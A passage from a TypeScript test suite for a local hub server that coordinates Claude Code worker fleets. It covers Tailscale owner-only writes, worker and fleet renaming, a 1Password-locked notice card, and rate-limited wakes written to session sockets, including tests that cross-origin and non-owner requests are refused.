    const sent = await post({ text: "hi" });
    expect([sent.status, sent.body["author"]]).toEqual([201, undefined]);
    const stream = await Stream.open("/f/p/events");
    expect(data(await stream.next())).toEqual({ write: true, max_bytes: 256 * 1024 });
    stream.close();
  });

  test("with Tailscale only the machine's owner writes, and the message records the login", async () => {
    const fake = join(base, "tailscale");
    writeFileSync(fake, FAKE_TAILSCALE);
    chmodSync(fake, 0o755);
    await start({ tailscale: fake });
    expect(running?.url).toBe(`http://box.tail.ts.net:${port}/`);
    const eve = await post({ text: "hi" }, { "Tailscale-User-Login": "eve@example.com" });
    expect([eve.status, eve.body]).toEqual([403, { error: `only ${OWNER} can write here` }]);
    const me = await post({ text: "hi" }, { "Tailscale-User-Login": "LUIZ@example.com" });
    expect([me.status, me.body["author"]]).toEqual([201, "LUIZ@example.com"]);
    const local = await post({ text: "from this machine" });
    expect([local.status, local.body["author"]]).toEqual([201, OWNER]);
    const stream = await Stream.open("/f/p/events", { "Tailscale-User-Login": "eve@example.com" });
    expect(data(await stream.next())).toEqual({ write: false, reason: `only ${OWNER} can write here`, you: "eve@example.com", max_bytes: 256 * 1024 });
    stream.close();
    expect((await request("GET", "/f/p/chat", undefined, { Host: `box.tail.ts.net:${port}` })).status).toBe(200);
  });

  test("a tailnet address is whoever Tailscale says owns it; any other address reads only", async () => {
    const header = (): string | null => null;
    const whois = (ip: string): Promise<string | undefined> => Promise.resolve(ip === "100.101.1.2" ? OWNER : "eve@example.com");
    const mine = await viewerOf("100.101.1.2", header, OWNER, whois);
    const theirs = await viewerOf("100.90.3.4", header, OWNER, whois);
    const outside = await viewerOf("192.168.1.5", header, OWNER, whois);
    expect([writerRefusal(OWNER, mine), writerRefusal(OWNER, theirs), writerRefusal(OWNER, outside)]).toEqual([
      undefined,
      `only ${OWNER} can write here`,
      `only ${OWNER} can write here`,
    ]);
    expect(hello(OWNER, theirs)).toEqual({ write: false, reason: `only ${OWNER} can write here`, you: "eve@example.com", max_bytes: 256 * 1024 });
    expect(postRefusal(undefined, outside, new Set(), header)?.[0]).toBe(403);
    expect([isTailnetIp("100.64.0.1"), isTailnetIp("100.127.255.1"), isTailnetIp("100.128.0.1"), isTailnetIp("fd7a:115c:a1e0::1"), isTailnetIp("10.0.0.1")]).toEqual([
      true,
      true,
      false,
      true,
      false,
    ]);
  });

  test("tailscale status reads as this machine, its owner and its online peers", () => {
    const net = tailnetOf({
      BackendState: "Running",
      Self: { DNSName: "box.tail.ts.net.", TailscaleIPs: ["100.69.1.1", "fd7a::1"], UserID: 7 },
      User: { "7": { LoginName: OWNER } },
      Peer: { k: { DNSName: "cache.tail.ts.net.", TailscaleIPs: ["100.70.1.1"], Online: true }, j: { DNSName: "mac.tail.ts.net.", TailscaleIPs: [], Online: false } },
    });

    expect([net?.self.name, net?.self.ip, net?.login, net?.peers.map((p) => [p.name, p.ip, p.online])]).toEqual([
      "box",
      "100.69.1.1",
      OWNER,
      [
        ["cache", "100.70.1.1", true],
        ["mac", undefined, false],
      ],
    ]);
    expect(tailnetOf({ BackendState: "Stopped" })).toBeUndefined();
  });
});

describe("names given on the page", () => {
  const row = (id: string): JsonObject => asObject((asArray(JSON.parse(readFileSync(join(root, "state.json"), "utf8"))["agents"]) ?? []).find((a) => asObject(a)?.["id"] === id)) ?? {};

  test("a worker renamed from the page is the user's, and an empty name gives it back", async () => {
    await start();
    const named = await post({ agent: "a2", name: " Writer " }, {}, "/f/p/name");
    expect([named.status, named.body]).toEqual([200, { agent: "a2", name: "Writer", name_by: "user" }]);
    expect([row("a2")["name"], row("a2")["name_by"]]).toEqual(["Writer", "user"]);
    const taken = await post({ agent: "a2", name: "Notes-Impl" }, {}, "/f/p/name");
    expect([taken.status, String(taken.body["error"])]).toEqual([400, expect.stringContaining("a mention could not tell them apart")]);
    expect((await post({ agent: "zz", name: "x" }, {}, "/f/p/name")).body).toEqual({ error: "no worker 'zz'" });
    expect((await post({ agent: 2, name: "x" }, {}, "/f/p/name")).status).toBe(400);
    const cleared = await post({ agent: "a2", name: "" }, {}, "/f/p/name");
    expect([cleared.status, cleared.body]).toEqual([200, { agent: "a2", name: "a2" }]);
    expect([row("a2")["name"], row("a2")["name_by"]]).toEqual(["a2", undefined]);
  });

  test("only who may write the chat renames, and a refusal changes nothing", async () => {
    const fake = join(base, "tailscale");
    writeFileSync(fake, FAKE_TAILSCALE);
    chmodSync(fake, 0o755);
    await start({ tailscale: fake });
    const before = readFileSync(join(root, "state.json"), "utf8");
    const eve = await post({ agent: "a2", name: "Writer" }, { "Tailscale-User-Login": "eve@example.com" }, "/f/p/name");
    expect([eve.status, eve.body]).toEqual([403, { error: `only ${OWNER} can write here` }]);
    expect((await post({ name: "Checkout" }, { "Tailscale-User-Login": "eve@example.com" }, "/f/p/name")).status).toBe(403);
    expect((await post({ agent: "a2", name: "Writer" }, { Origin: "http://evil.example" }, "/f/p/name")).status).toBe(403);
    expect((await request("POST", "/f/p/name", JSON.stringify({ agent: "a2", name: "Writer" }))).status).toBe(415);
    expect(readFileSync(join(root, "state.json"), "utf8")).toBe(before);
    expect(machine(env).registry.live().map((e) => e.id)).toEqual(["p"]);
  });

  test("the fleet renamed from the page moves to its new address, and its page says what it is called", async () => {
    await start();
    const named = await post({ name: "Checkout" }, {}, "/f/p/name");
    expect([named.status, named.body]).toEqual([200, { id: "checkout", session: "Checkout", path: "/f/checkout/" }]);
    const moved = await request("GET", "/f/p/");
    expect([moved.status, moved.headers.get("Location")]).toEqual([301, "/f/checkout/"]);
    const page = await (await fetch(`http://127.0.0.1:${port}/f/checkout/`)).text();
    expect(page).toContain('"named": {"id": "checkout", "session": "Checkout"}');
    expect((await post({ name: "user" }, {}, "/f/checkout/name")).status).toBe(400);
    const cleared = await post({ name: "" }, {}, "/f/checkout/name");
    expect([cleared.status, cleared.body]).toEqual([200, { id: "checkout", session: null, path: "/f/checkout/" }]);
  });
});

describe("1Password locked: the card on every page, and Luiz's answer", () => {
  const SINCE = "2026-01-01T00:00:00+00:00";

  const SSH: JsonObject = { since: SINCE, why: "SSH signing through 1Password failed", hosts: ["github.com"] };

  const OP: JsonObject = { since: "2026-01-01T00:10:00+00:00", why: "the 1Password prompt was dismissed" };

  const NOTICE = "[hub] 1Password is unlocked (T). Held here: SSH through the 1Password agent (jj and git remotes, ssh). Retry.";

  let manager: string;

  /** What this hub was asked to write to a session's socket (it writes to none), and how each write ends. */
  let sent: { readonly path: string; readonly text: string }[];

  let written: () => Promise<string | undefined>;

  /** What this hub is told of a session's process: gone, unless a test says it is there; then the one the entry
   * names (this test's own, with its real start) is taken for Claude Code, which no test process is. */
  let there: boolean;

  const session: Probe = {
    running: (pid) => {
      const started = startedOf(pid);

      return there && started !== undefined ? { claude: true, started } : "gone";
    },
    holds: () => true,
    startedMs: () => undefined,
  };

  const statePath = (): string => join(home, "onepw", "locked.json");

  const logged = (): string => (existsSync(join(home, "onepw", "onepw.log")) ? readFileSync(join(home, "onepw", "onepw.log"), "utf8") : "");

  const dated = (text: string): string => text.replace(/\(\d\d:\d\d; locked since \d\d:\d\d\)/u, "(T)");

  const held = (dir: string, kind = "ssh-agent", what = "jj git push"): JsonObject => ({ dir, fleet: "p", session: "s-secret-1", worker: "a1", kind, what, at: SINCE, seen: "failed" });

  /** Write `REGISTRY/onepw/locked.json` as the plugin's hook does: this fleet's worker held, since a time that never lapses in a test. */
  function lock(kinds: JsonObject = { "ssh-agent": SSH }, waiting: readonly JsonObject[] = [held(root)]): void {
    mkdirSync(join(home, "onepw"), { recursive: true });
    writeFileSync(statePath(), JSON.stringify({ v: 2, kinds, waiting }));
  }

  const card = async (fleet: string): Promise<JsonObject | undefined> => asObject((await request("GET", `/f/${fleet}/state.json`)).body["onepw"]);

  const kinds = (): JsonObject => asObject(asObject(JSON.parse(readFileSync(statePath(), "utf8")))?.["kinds"]) ?? {};

  const hub = (): Running["hub"] => {
    if (running === undefined) throw new Error("no hub");

    return running.hub;
  };

  /** The session process's socket, as a file: with `there`, the hub reads the session as one it can write to. */
  function socket(): string {
    const path = socketOf(join(home, "cc-socks"), process.pid);
    mkdirSync(join(home, "cc-socks"), { recursive: true });
    writeFileSync(path, "");

    return path;
  }

  beforeEach(async () => {
    env = baseEnv(home, { FLEET_ONEPW_LAPSE_S: String(100 * 365 * 86400), HOME: join(base, "home") });
    manager = join(base, "all", "coordinator");
    mkdirSync(manager, { recursive: true });
    writeState(manager, [], { role: "manager", project: "all" });
    register(manager, "manager");
    sent = [];
    written = () => Promise.resolve(undefined);
    there = false;

    const send: Send = (path, text) => {
      sent.push({ path, text });

      return written();
    };

    port = freePort();
    const got = await startHub({ port, machine: machine(env), tailscale: join(base, "no-tailscale"), peers: false, hosts: [], https: undefined, send, session }, () => {});

    if (got instanceof Error) throw got;
    running = got;
  });

  test("every page's view carries the card while it is locked, the manager's and a fleet's, and no page does otherwise", async () => {
    expect([await card("p"), await card("manager")]).toEqual([undefined, undefined]);
    expect(Object.keys((await request("GET", "/f/p/state.json")).body)).not.toContain("onepw");
    lock({ "ssh-agent": SSH, "op-desktop": { ...OP, again: "2026-01-01T00:20:00+00:00" } }, [held(root), held(manager, "op-desktop", "gh pr")]);

    const shown = {
      since: SINCE,
      why: "SSH signing through 1Password failed",
      again: "2026-01-01T00:20:00+00:00",
      waiting: [{ who: "p", what: "SSH (a push, a fetch or a connection)" }, { who: "manager", what: "reading secrets" }],
    };

    expect([await card("p"), await card("manager")]).toEqual([shown, shown]);
    const page = await (await fetch(`http://127.0.0.1:${port}/f/p/`)).text();
    expect(page).toContain('"onepw": {"since": "2026-01-01T00:00:00+00:00"');
    expect(page).not.toContain("s-secret-1");
    expect(JSON.stringify((await request("GET", "/f/p/state.json")).body)).not.toMatch(/s-secret-1|jj git push|gh pr|github\.com/u);
    lock({ "ssh-agent": { ...SSH, cleared: { at: SINCE, by: "command", note: "jj git push" } }, "op-desktop": OP }, [held(root), held(manager, "op-desktop", "gh pr")]);
    expect(await card("p")).toEqual({ since: "2026-01-01T00:10:00+00:00", why: "the 1Password prompt was dismissed", again: null, waiting: [{ who: "manager", what: "reading secrets" }] });
    lock({ "ssh-agent": { ...SSH, cleared: { at: SINCE, by: "command", note: "jj git push" } } });
    expect([await card("p"), await card("manager")]).toEqual([undefined, undefined]);
    expect(Object.keys((await request("GET", "/f/p/state.json")).body)).not.toContain("onepw");
  });

  test("the card's POST, same-origin and the owner's, clears every locked kind as the user, tells the held fleet at once, and the card goes from the stream", async () => {
    lock({ "ssh-agent": SSH, "op-desktop": OP });
    const stream = await Stream.open("/f/p/events");
    expect(asObject(data(await stream.nextOf("state"))["onepw"])?.["why"]).toBe("SSH signing through 1Password failed");
    const answered = await post({}, { Origin: `http://127.0.0.1:${port}`, "Sec-Fetch-Site": "same-origin" }, "/f/manager/onepw/unlocked");
    expect([answered.status, answered.body]).toEqual([200, { cleared: true, told: [{ fleet: "p", to: "coordinator", id: 1, via: "chat" }] }]);
    expect(readChat(root).map((m) => [m.from, m.to, dated(m.text)])).toEqual([["fleet-hub", ["coordinator"], NOTICE]]);
    expect([readChat(manager), sent]).toEqual([[], []]);
    expect(Object.values(kinds()).map((kind) => asObject(asObject(kind)?.["cleared"])?.["by"])).toEqual(["user", "user"]);
    expect(Object.keys(data(await stream.nextOf("state")))).not.toContain("onepw");
    expect(data(await stream.nextOf("chat"))["from"]).toBe("fleet-hub");
    stream.close();
    expect(logged()).toContain(" cleared by user: answered on the page\n");
    const again = await post({}, {}, "/f/p/onepw/unlocked");
    expect([again.status, again.body]).toEqual([200, { cleared: false, told: [] }]);
    expect(readChat(root).length).toBe(1);
  });

  test("a held fleet whose host's watch is dead is told in its session, through the write a wake takes", async () => {
    const path = socket();
    there = true;
    lock();
    const answered = await post({}, {}, "/f/p/onepw/unlocked");
    expect([answered.status, answered.body]).toEqual([200, { cleared: true, told: [{ fleet: "p", to: "coordinator", id: null, via: "session" }] }]);
    expect([sent.map((s) => [s.path, dated(s.text)]), readChat(root)]).toEqual([[[path, NOTICE]], []]);
    expect(logged()).toContain(" told p (its session): [hub] 1Password is unlocked (");
  });

  test("a refused POST leaves the state as it is, byte for byte, clears nothing and tells nobody", async () => {
    lock({ "ssh-agent": SSH, "op-desktop": OP });
    socket();
    there = true;
    const before = readFileSync(statePath(), "utf8");
    const self = `http://127.0.0.1:${port}`;

    const refused: (readonly [string, number, () => Promise<Answer>])[] = [
      ["a reader who may not write", 403, () => post({}, { "Tailscale-User-Login": "eve@example.com" }, "/f/p/onepw/unlocked")],
      ["a foreign Origin", 403, () => post({}, { Origin: "https://evil.example" }, "/f/p/onepw/unlocked")],
      ["Origin: null", 403, () => post({}, { Origin: "null" }, "/f/p/onepw/unlocked")],
      ["Sec-Fetch-Site: cross-site", 403, () => post({}, { Origin: self, "Sec-Fetch-Site": "cross-site" }, "/f/p/onepw/unlocked")],
      ["Sec-Fetch-Site: cross-site and no Origin", 403, () => post({}, { "Sec-Fetch-Site": "cross-site" }, "/f/p/onepw/unlocked")],
      ["a wrong content type", 415, () => request("POST", "/f/p/onepw/unlocked", "{}", { "Content-Type": "text/plain", Origin: self })],
      ["no content type of its own", 415, () => request("POST", "/f/p/onepw/unlocked", "{}")],
      ["a body over the cap", 413, () => post({ note: "x".repeat(300_000) }, { Origin: self, "Sec-Fetch-Site": "same-origin" }, "/f/p/onepw/unlocked")],
      ["a GET", 404, () => request("GET", "/f/p/onepw/unlocked")],
      ["a fleet nobody serves", 404, () => post({}, {}, "/f/nobody/onepw/unlocked")],
    ];

    for (const [name, status, ask] of refused) {
      const answer = await ask();
      expect([name, answer.status, readFileSync(statePath(), "utf8") === before, logged().includes("cleared by user"), readChat(root), sent]).toEqual([name, status, true, false, [], []]);
    }

    expect(asArray((await card("p"))?.["waiting"])?.length).toBe(1);
    expect(await hub().settleOnepw()).toBeUndefined();
  });

  test("the hub settles a kind a command cleared, once, and a hold that is not over is left alone", async () => {
    lock();
    expect(await hub().settleOnepw()).toBeUndefined();
    expect(readChat(root)).toEqual([]);
    lock({ "ssh-agent": { ...SSH, cleared: { at: SINCE, by: "command", note: "jj git push" } }, "op-desktop": OP }, [held(root), held(manager, "op-desktop", "gh pr")]);
    expect((await hub().settleOnepw())?.told.map((t) => [t.fleet, t.to, t.via])).toEqual([["p", "coordinator", "chat"]]);
    expect(await hub().settleOnepw()).toBeUndefined();
    expect([readChat(root).map((m) => dated(m.text)), readChat(manager)]).toEqual([[NOTICE], []]);
    expect((await card("p"))?.["waiting"]).toEqual([{ who: "manager", what: "reading secrets" }]);
  });

  test("the hub settles one at a time: a look while one runs is that one, and the card's POST waits for it and tells in its own", async () => {
    socket();
    there = true;
    let release: (why: string | undefined) => void = () => {};

    written = () => new Promise((resolve) => (release = resolve));
    lock({ "ssh-agent": { ...SSH, cleared: { at: SINCE, by: "command", note: "jj git push" } }, "op-desktop": OP }, [held(root), held(manager, "op-desktop", "gh pr")]);
    const first = hub().settleOnepw();
    const second = hub().settleOnepw();
    const answered = post({}, {}, "/f/p/onepw/unlocked");
    await new Promise((wake) => setTimeout(wake, 150));
    expect(sent.length).toBe(1);
    written = () => Promise.resolve(undefined);
    release(undefined);
    const told = [{ fleet: "p", to: "coordinator", id: undefined, via: "session" as const, text: sent[0]?.text ?? "" }];
    expect([await first, await second]).toEqual([{ told }, { told }]);
    const answer = await answered;
    expect([answer.status, answer.body]).toEqual([200, { cleared: true, told: [{ fleet: "manager", to: "manager", id: null, via: "session" }] }]);
    expect(sent.map((s) => dated(s.text))).toEqual([NOTICE, "[hub] 1Password is unlocked (T). Held here: secrets read through the 1Password app (op, secretspec, gh, aws). Retry."]);
    expect([readChat(root), readChat(manager)]).toEqual([[], []]);
  });
});

describe("a host that does not listen: the hub's wake, the page's line, and Wake now", () => {
  let manager: string;

  let socket: string;

  /** How far this hub's clock runs ahead of the machine's, in ms: a test moves it past a wake's limits. */
  let ahead: number;

  /** Whose a socket is: the machine's own answer (procs.ts `holdsSocket`) unless a test says. */
  let owns: Probe["holds"];

  /** What this hub is told of a session's process: the one the entry names (this test's own, with its real
   * start) is taken for Claude Code, which no test process is. All else is the machine's answer. */
  const session: Probe = {
    running: (pid) => {
      const started = startedOf(pid);

      return started === undefined ? "gone" : { claude: true, started };
    },
    holds: (pid, path) => owns(pid, path),
    startedMs: () => undefined,
  };

  const listeners: Server[] = [];

  /** Listen on the session's socket as its process would: each line written to it, as it lands. */
  function listen(): Promise<string[]> {
    const lines: string[] = [];
    mkdirSync(join(home, "cc-socks"), { recursive: true });

    const server = createServer((conn) => {
      const chunks: Buffer[] = [];
      conn.on("data", (chunk: Buffer) => chunks.push(chunk));
      conn.on("end", () => lines.push(Buffer.concat(chunks).toString("utf8")));
    });

    listeners.push(server);

    return new Promise((ready) => server.listen(socket, () => ready(lines)));
  }

  /** Wait until `count` lines landed on the session's socket, 5 s at most. */
  async function landed(lines: readonly string[], count: number): Promise<void> {
    for (let tries = 0; tries < 250 && lines.length < count; tries += 1) await new Promise((wake) => setTimeout(wake, 20));
  }

  const hub = (): Running["hub"] => {
    if (running === undefined) throw new Error("no hub");

    return running.hub;
  };

  const deaf = async (fleet: string): Promise<JsonObject | undefined> => asObject((await request("GET", `/f/${fleet}/state.json`)).body["deaf"]);

  const ofManager = async (): Promise<JsonObject | undefined> => asObject(asObject(asArray((await request("GET", "/f/manager/state.json")).body["coordinators"])?.[0])?.["deaf"]);

  const line = (unread: number): string => lineOf(String(wakeText("p", root, "coordinator", unread, 0)));

  /** What the hub recorded of the wakes for fleet p, once the look it took with the last message is over. */
  const recorded = async (): Promise<JsonObject[]> => {
    await hub().wakeHosts();
    const text = existsSync(join(home, "hub", "wakes.json")) ? readFileSync(join(home, "hub", "wakes.json"), "utf8") : "{}";

    return (asArray(asObject(asObject(JSON.parse(text))?.[root])?.["wakes"]) ?? []).flatMap((w) => {
      const wake = asObject(w);

      return wake === undefined ? [] : [wake];
    });
  };

  /** When a hold that ends `ms` after the stamp `at` is over, as the hub says it: the first whole second at or after. */
  const after = (at: JsonObject[string] | undefined, ms: number): string => stampOf(new Date(Math.ceil(((parseInstant(asString(at) ?? "") ?? 0) + ms) / 1000) * 1000));

  beforeEach(async () => {
    env = baseEnv(home, { FLEET_UNHEARD_S: "0" });
    socket = socketOf(join(home, "cc-socks"), process.pid);
    manager = join(base, "all", "coordinator");
    mkdirSync(manager, { recursive: true });
    writeState(manager, [], { role: "manager", project: "all" });
    register(manager, "manager");
    ahead = 0;
    owns = holdsSocket;

    const clock = machineOf(
      () => new Date(Date.now() + ahead),
      (name) => env[name] ?? process.env[name],
    );

    await start({ session, machine: clock });
  });

  afterEach(() => {
    for (const server of listeners.splice(0)) server.close();
  });

  test("a deaf host's view has the key, on its page and the manager's; no view has it once the host answered", async () => {
    const sent = await post({ text: "are you there? @coordinator" });
    const shown = { since: sent.body["at"] ?? null, unread: 1, first: 1, woken: [], end: "gone", why: "it has no socket", held: null, again: null };
    expect([await deaf("p"), await ofManager()]).toEqual([shown, shown]);
    say("coordinator", "here", { re: 1 });
    // A view is kept two seconds while the ledger does not change.
    await new Promise((wake) => setTimeout(wake, 2100));
    expect([await deaf("p"), await ofManager()]).toEqual([undefined, undefined]);
    expect(Object.keys((await request("GET", "/f/p/state.json")).body)).not.toContain("deaf");
  });

  test("the user's message to a deaf host wakes it at once, with no look of the timer: one wake on the session's socket, the page gets its time, the message stays unread, and the next looks wait", async () => {
    const lines = await listen();
    const started = performance.now();
    await post({ text: "SECRET are you there?" });
    await landed(lines, 1);
    // Not the timer's look (every 10 s): the one the hub took with the message. Half the timer's period, so a
    // machine busy with the other suites does not fail it.
    expect(performance.now() - started).toBeLessThan(5000);
    expect(lines).toEqual([line(1)]);
    expect(lines[0]).not.toContain("SECRET");
    // A second message is looked at too, and the wake of before was not answered: nothing more is written.
    await post({ text: "and now?" });
    const done = await recorded();
    expect(done.map((w) => [w["first"], w["by"], w["error"]])).toEqual([[1, "hub", null]]);
    const shown = await deaf("p");
    expect([shown?.["woken"], shown?.["end"], shown?.["unread"]]).toEqual([[done[0]?.["at"] ?? ""], null, 2]);
    expect((await ofManager())?.["woken"]).toEqual([done[0]?.["at"] ?? ""]);
    expect(asObject((await request("GET", "/f/p/state.json")).body["chat"])).toMatchObject({ on: false, unread: 2 });
    expect(await hub().wakeHosts()).toEqual([]);
    expect(lines.length).toBe(1);
    expect(readChat(root).map((m) => m.from)).toEqual(["user", "user"]);
    expect(Object.keys(asObject(JSON.parse(readFileSync(join(home, "hub", "wakes.json"), "utf8"))) ?? {})).toEqual([root]);
  });

  test.skipIf(process.platform !== "linux")("a hub that asks the machine itself writes nothing to a process that is not Claude Code, though it listens on the socket named after it", async () => {
    await running?.stop();
    await start();
    const lines = await listen();
    await post({ text: "are you there?" });
    const gone = `process ${String(process.pid)} is not Claude Code`;
    expect((await recorded()).map((w) => [w["by"], w["error"]])).toEqual([["hub", `the session is gone: ${gone}`]]);
    const now = await post({}, {}, "/f/p/wake");
    expect([now.status, now.body]).toEqual([409, { error: `the session is gone (${gone}): there is nobody to write to. Open it in a terminal`, again: null }]);
    await new Promise((wake) => setTimeout(wake, 100));
    expect(lines).toEqual([]);
    expect(await deaf("p")).toMatchObject({ end: "gone", why: gone, woken: [] });
  });

  test("Wake now's POST writes one wake at once, from the fleet's page and from the manager's for a fleet it names: one a minute, and three an hour with the hub's", async () => {
    const lines = await listen();
    await post({ text: "are you there?" });
    const [first] = await recorded();
    expect([first?.["by"], first?.["error"]]).toEqual(["hub", null]);
    const own = await post({}, { Origin: `http://127.0.0.1:${port}`, "Sec-Fetch-Site": "same-origin" }, "/f/p/wake");
    expect([own.status, own.body["woken"], own.body["fleet"]]).toEqual([200, true, "p"]);
    // A second within the minute is held, from whichever page: 429, with when it may be used. Twenty in a row write nothing.
    const minute = { error: "not woken: you woke it less than a minute ago", again: after(own.body["at"], 60_000) };

    for (let n = 0; n < 10; n += 1) {
      const fromManager = await post({ fleet: "p" }, {}, "/f/manager/wake");
      const fromOwn = await post({}, {}, "/f/p/wake");
      expect([fromManager.status, fromManager.body, fromOwn.status, fromOwn.body]).toEqual([429, minute, 429, minute]);
    }

    expect(await deaf("p")).toMatchObject({ held: "you woke it less than a minute ago", again: minute.again });
    await new Promise((wake) => setTimeout(wake, 100));
    expect(lines).toEqual([line(1), line(1)]);
    ahead += 60_000;
    const named = await post({ fleet: "p" }, {}, "/f/manager/wake");
    expect([named.status, named.body["woken"], named.body["fleet"]]).toEqual([200, true, "p"]);
    await landed(lines, 3);
    expect(lines).toEqual([line(1), line(1), line(1)]);
    // The user's wakes stand beside the hub's in the record: the page shows each, and the hub's count is not started again.
    expect((await deaf("p"))?.["woken"]).toEqual([first?.["at"] ?? "", own.body["at"] ?? "", named.body["at"] ?? ""]);
    // The hour's three are written, the hub's and the user's together: the next is refused, with when one is free.
    ahead += 60_000;
    const hour = { error: "not woken: 3 wakes in the last hour, the most a fleet is written", again: after(first?.["at"], 3600_000) };
    const spent = await post({}, {}, "/f/p/wake");
    expect([spent.status, spent.body]).toEqual([429, hour]);
    expect(await ofManager()).toMatchObject({ held: "3 wakes in the last hour, the most a fleet is written", again: hour.again, end: null });
    expect(await hub().wakeHosts()).toEqual([]);
    await new Promise((wake) => setTimeout(wake, 100));
    expect(lines.length).toBe(3);
  });

  test("a POST that cannot wake says why and writes nothing: nothing waits, another page's fleet, no socket, a socket not the session's own, a socket that refuses", async () => {
    const nothing = await post({}, {}, "/f/p/wake");
    expect([nothing.status, nothing.body]).toEqual([409, { error: "none of your messages waits unread: there is nothing to wake", again: null }]);
    expect(existsSync(join(home, "hub", "wakes.json"))).toBe(false);
    await post({ text: "are you there?" });
    // The hub looked with the message, and found nobody to write to: its own failed wake, the one in the record.
    const own = [["hub", "the session is gone: it has no socket"]];
    expect((await recorded()).map((w) => [w["by"], w["error"]])).toEqual(own);
    const gone = await post({}, {}, "/f/p/wake");
    expect([gone.status, gone.body]).toEqual([409, { error: "the session is gone (it has no socket): there is nobody to write to. Open it in a terminal", again: null }]);
    expect((await post({ fleet: "manager" }, {}, "/f/p/wake")).status).toBe(404);
    expect((await post({ fleet: "nobody" }, {}, "/f/manager/wake")).status).toBe(404);
    // A file where the socket would be: the session's process is there by the registry, and the socket is nobody's.
    mkdirSync(join(home, "cc-socks"), { recursive: true });
    writeFileSync(socket, "");
    const foreign = await post({}, {}, "/f/p/wake");
    expect([foreign.status, foreign.body["error"]]).toEqual([409, "the session is gone (the socket named after it is not its own): there is nobody to write to. Open it in a terminal"]);
    expect((await recorded()).map((w) => [w["by"], w["error"]])).toEqual(own);
    // The machine says the socket is the session's, and nothing answers on it.
    owns = () => true;
    const refused = await post({}, {}, "/f/p/wake");
    expect([refused.status, asString(refused.body["error"])?.startsWith("could not wake p: the session's socket ")]).toEqual([502, true]);
    const shown = await deaf("p");
    expect([shown?.["end"], shown?.["woken"], asString(shown?.["why"])?.startsWith("the session's socket ")]).toEqual(["failed", [], true]);
    // The machine does not say whose it is: nothing is written, nothing recorded, and it may be tried again.
    owns = () => "unknown";
    ahead += 61_000;
    const unknown = await post({}, {}, "/f/p/wake");
    expect([unknown.status, unknown.body]).toEqual([409, { error: "the machine did not say whose the session's socket is: nothing was written. Try again", again: null }]);
    expect((await recorded()).map((w) => w["by"])).toEqual(["hub", "user"]);
  });

  test("a refused POST wakes nobody", async () => {
    const lines = await listen();
    await post({ text: "are you there?" });
    // The hub's own wake for the message, and no other.
    await landed(lines, 1);

    const refused: (readonly [number, Answer])[] = [
      [403, await post({}, { Origin: "https://evil.example" }, "/f/p/wake")],
      [403, await post({}, { Origin: "null" }, "/f/p/wake")],
      [403, await post({}, { "Tailscale-User-Login": "eve@example.com" }, "/f/p/wake")],
      [415, await request("POST", "/f/p/wake", "{}")],
      [404, await request("GET", "/f/p/wake")],
      [404, await post({}, {}, "/f/nobody/wake")],
    ];

    expect(refused.map(([status, answer]) => [status, answer.status])).toEqual(refused.map(([status]) => [status, status]));
    await new Promise((wake) => setTimeout(wake, 100));
    expect(lines).toEqual([line(1)]);
    expect((await recorded()).map((w) => w["by"])).toEqual(["hub"]);
  });

  test("20 Wake now POSTs at the same instant write one line to the socket: one is answered 200, and it holds the other 19 with 429", async () => {
    const lines = await listen();
    await post({ text: "are you there?" });
    const all = await Promise.all(Array.from({ length: 20 }, () => post({}, { Origin: `http://127.0.0.1:${port}`, "Sec-Fetch-Site": "same-origin" }, "/f/p/wake")));
    await new Promise((wake) => setTimeout(wake, 300));
    // The hub's own wake for the message, then one of the twenty.
    expect([all.filter((a) => a.status === 200).length, all.filter((a) => a.status === 429).length, lines]).toEqual([1, 19, [line(1), line(1)]]);
    expect(new Set(all.filter((a) => a.status === 429).map((a) => a.body["error"]))).toEqual(new Set(["not woken: you woke it less than a minute ago"]));
    expect((await recorded()).map((w) => w["by"])).toEqual(["hub", "user"]);
  });

  test("a message the hub takes while a look runs is looked at when that look is over, not at the timer's next", async () => {
    await running?.stop();
    const sent: string[] = [];
    let release: () => void = () => {};

    // The first write waits for the test; the ones after it are written at once.
    const send: Send = (_path, text) => {
      sent.push(text);

      return sent.length > 1 ? Promise.resolve(undefined) : new Promise((resolve) => (release = () => resolve(undefined)));
    };

    // The socket named after the sessions' process, which the machine says is its own: both fleets' host is there.
    mkdirSync(join(home, "cc-socks"), { recursive: true });
    writeFileSync(socket, "");
    owns = () => true;
    await start({ session, machine: machineOf(() => new Date(), (name) => env[name] ?? process.env[name]), send });

    // The look goes over the fleets in the registry's order: the message to the last of them holds it in its write.
    const [early, late] = machine(env)
      .registry.live()
      .map((e) => e.id);

    await post({ text: "are you there?" }, {}, `/f/${late ?? ""}/chat`);

    for (let tries = 0; tries < 100 && sent.length < 1; tries += 1) await new Promise((wake) => setTimeout(wake, 20));
    expect(sent.length).toBe(1);
    // The fleet the look already passed gets a message: only another look finds it.
    await post({ text: "and you?" }, {}, `/f/${early ?? ""}/chat`);
    await new Promise((wake) => setTimeout(wake, 100));
    expect(sent.length).toBe(1);
    release();

    for (let tries = 0; tries < 100 && sent.length < 2; tries += 1) await new Promise((wake) => setTimeout(wake, 20));
    expect(sent.map((text) => text.split(" ")[1])).toEqual([late ?? "", early ?? ""]);
  });

  test("a fleet whose chat the hub cannot read: its look is logged once, its page and the manager's still answer and say so, and no key is left once it reads", async () => {
    const blind = async (path: string): Promise<JsonObject | undefined> => {
      const body = (await request("GET", path)).body;

      return asObject((path.includes("manager") ? asObject(asArray(body["coordinators"])?.[0]) : body)?.["blind"]);
    };

    await post({ text: "are you there?" });
    rmSync(join(root, "chat.jsonl"));
    mkdirSync(join(root, "chat.jsonl"));
    expect(await hub().wakeHosts()).toEqual([]);
    expect(await hub().wakeHosts()).toEqual([]);
    const why = `${join(root, "chat.jsonl")} is not a file`;
    expect(logged.filter((l) => l.startsWith("wake: "))).toEqual([`wake: p (${root}): the hub cannot read its chat: ${why}. Nobody is woken for it until that works; the other fleets are looked at as before.`]);
    const [own, managed] = [await blind("/f/p/state.json"), await blind("/f/manager/state.json")];
    expect(own).toMatchObject({ what: "chat", why });
    expect([parseInstant(asString(own?.["since"]) ?? "") !== undefined, managed]).toEqual([true, own]);
    expect((await request("GET", "/f/p/")).status).toBe(200);
    rmSync(join(root, "chat.jsonl"), { recursive: true });
    await hub().wakeHosts();
    await new Promise((wake) => setTimeout(wake, 2100));
    expect([await blind("/f/p/state.json"), await blind("/f/manager/state.json")]).toEqual([undefined, undefined]);
  });

  test("a takeover is on the fleet's page and the manager's from the moment it is recorded until the host has read the user's next message", async () => {
    const takeover = async (path: string): Promise<JsonObject | undefined> => {
      const body = (await request("GET", path)).body;

      return asObject((path.includes("manager") ? asObject(asArray(body["coordinators"])?.[0]) : body)?.["takeover"]);
